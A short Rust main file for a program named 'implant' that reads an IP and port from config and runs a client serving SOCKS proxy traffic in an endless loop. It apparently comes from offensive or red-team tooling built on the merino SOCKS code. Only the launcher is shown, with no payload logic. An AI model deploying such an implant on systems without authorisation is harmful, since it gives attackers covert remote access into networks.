use implant::*;
use std::error::Error;
mod config;
use config::{IP, PORT};

// base socks code sourced from https://github.com/ajmwagar/merino,
// with modifications by @deadjakk

fn main() -> Result<(), Box<dyn Error>> {
  let mut client = Client::new(PORT, IP)?;

  loop {
    match client.serve() {
      Ok(_) => (),
      Err(e) => println!("{:?}", e),
    };
  }
}
